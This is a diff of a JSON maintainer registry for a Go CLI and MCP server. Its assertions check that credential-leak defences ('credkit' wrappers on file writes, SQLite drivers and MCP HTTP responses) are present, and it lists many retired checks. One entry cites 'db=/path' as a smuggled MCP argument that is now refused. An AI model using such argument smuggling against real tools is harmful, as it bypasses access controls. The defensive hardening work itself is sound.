+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "contains": "credkit.WriteFile(path,",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "if err := credkit.AppendFile(p, append(line, '\\n'), 0o600); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/teach_log.go",
+     "contains": "if err := credkit.AppendFile(p, append(line, '\\n'), 0o600); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "credkit.HoldBody(data)",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credentials.go",
+     "contains": "credkit.HoldBody(data)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "err := credkit.RunCommand(cmd)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/rewst_guard.go",
+     "not_contains": "originPinTripper"
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "not_contains": "FunnelHeld("
+    },
+    {
+     "file": "cli/internal/rewstblackbox/composed_encoding_test.go",
+     "contains": "func TestSecretInComposedEncodingNeverPrints(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credkit-sqlite-every-handle",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "Every SQLite handle goes through credkit.SQLDriver: internal/credsql registers the one driver and every sql.Open in store.go and platform/migration.go names it, the read-only opener included, which runs \"select 1\" because the kit's connection does not forward Ping. The MCP sql value cap moved from sqlite.Limit on a held connection to a DSN parameter (store.OpenReadOnlyValueCapped).",
+   "why": "A statement's text and bound values are a sink of their own, reads included.",
+   "spec_encode_followup": "Press-side: generate store, migration and MCP sql opens against one kit-wrapped driver name.",
+   "asserts": [
+    {
+     "file": "cli/internal/credsql/credsql.go",
+     "contains": "sql.Register(Driver, credkit.SQLDriver(cappedSQLite()))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "not_contains": "sql.Open(\"sqlite\""
+    },
+    {
+     "file": "cli/internal/platform/migration.go",
+     "not_contains": "sql.Open(\"sqlite\""
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "sql.Open(credsql.Driver,",
+     "min_count": 4,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/migration.go",
+     "contains": "sql.Open(credsql.Driver,",
+     "min_count": 4,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "func OpenReadOnlyValueCapped(dbPath string, maxValueBytes int) (*Store, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "db.ExecContext(ctx, \"select 1\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "sqlite.Limit("
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "openMCPReadOnlyStore(path, mcpSQLMaxValueBytes)",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credkit-mcphttp-outermost",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "credkit.MCPHTTP writes every response the MCP HTTP server serves, refusals included. requireBearerAuthWithLimits runs a preflight that writes nothing (Origin, bearer, bounded body read), then credkit.MCPHTTP around a gate that answers the refusal it decided.",
+   "why": "With the kit wrapping only the inner handler, a refusal answers outside it, and a bearer holding the refusal's text would get a piece of itself back.",
+   "spec_encode_followup": "Press-side: generate the MCP HTTP auth wrapper so its refusals are written by the kit-wrapped handler.",
+   "asserts": [
+    {
+     "file": "cli/cmd/rewst-mcp/main.go",
+     "contains": "kit := credkit.MCPHTTP(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/rewst-mcp/main.go",
+     "contains": "func mcpHTTPPreflight(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/rewst-mcp/main.go",
+     "not_contains": "func rejectMCPHTTPRequest("
+    }
+   ]
+  }
+ ],
+ "retired": [
+  {
+   "id": "mcp-filesystem-destination-gate",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0 builds a per-command blocked set (blockedDestinationFlags, blockedInputFlags, root control-plane flags), removes those flags from each tool's schema, refuses any undeclared argument name (so \"db=/path\" is refused) and skips '=' names in cliArgsFromMCP."
+  },
+  {
+   "id": "mcp-argv-value-joined",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #4647: every value-carrying branch of cliArgsFromMCP joins the value to its flag (--k=v, one element per list item), and the press generates TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag."
+  },
+  {
+   "id": "interim-http-security-note-2026-10-22",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: The note paused HTTP mode until a reprint because the build served HTTP with no token. Press 4.34.0 HTTP mode refuses to start without <PREFIX>_MCP_HTTP_TOKEN, answers 401 without the right bearer, binds 127.0.0.1 by default and refuses a non-loopback address without TLS; onboard.py now writes HTTP guidance that follows the binary (cc-skills #14) and never writes this note, so the entry would fail on every re-onboard."
+  },
+  {
+   "id": "mcp-file-flags-refused",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0's cobratree mirror derives one blocked set per command (destination, input, mcp:write-flags, mcp:read-flags and root control-plane flags), leaves those flags out of the tool schema and refuses them, and any undeclared argument, by name."
+  }
+ ],
+ "_superseded": [
+  {
+   "id": "secret-echo-decoded-funnel",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "output-chokepoint",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "file-sinks-withheld",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "store-never-keeps-secrets",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "mcp-protocol-messages-withheld",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "network-sinks-withheld",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "startup-output-held-first",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "mcp-held-arguments-refused",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "undecoded-encodings-every-alignment",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "held-forms-in-every-encoding",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "response-credentials-held",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "config-file-holds-no-credential",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "every-text-encoding-withheld",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "outbound-split-parts-refused",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "auth-carrier-names-and-shapes-held",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "secure-container-is-credential",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "r1-holder-reads-every-part",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "r1-mixed-byte-escapes-decoded",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "r1-split-across-deliveries-withheld",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "held-value-case-folded",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "output-units-reassembled",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "preclose-holder-numbers-and-cookies",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "preclose-escape-fixpoint",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "preclose-split-across-processes-and-protocol",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "refuse-held-uses-connector-chokepoint",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "output-derived-and-scheme-forms-matched-whole",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "g304-paths-cleaned-not-annotated",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "r1-short-value-encodings-withheld",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "r1-file-history-is-the-whole-file",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "r2-short-value-nested-encodings",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "api-origin-pinned",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "startup-error-lost",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "r1-credential-split-across-deliveries",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "r1-decoder-bound-read-as-no-echo",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "r1-persistence-gate-narrower-than-chokepoint",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "credential-named-by-sibling-member",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "r1-credential-pair-identity-unheld",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "r1-command-line-config-unheld-at-startup",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "r1-short-held-value-inside-other-text",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "r1-secret-in-headerless-compressed-stream",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "r1-unreadable-history-read-as-empty",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "r1-check-then-append-not-serialized",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "spec-credential-under-a-generic-name",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "r1-mask-shaped-credential",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "r2-whitespace-credential",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "bb-whitespace-query-credential",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "r1-non-text-sql-binding-unheld",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "r1-persistence-gate-skipped-under-agentcookie",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "passcode-is-a-credential-name",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "scheme-form-escaped-separator",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "r1-secret-in-unreadable-compressed-stream",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "r1-agentcookie-config-holds-credential",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "rewst-credential-names-exact",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "org-variable-secret-category",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "bb-jobs-ledger-writer-withheld",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "r1-secret-in-composed-encoding",
+   "status": "retired",
+   "reason": "replaced by the shared credential kit"
   }
  ]
 }
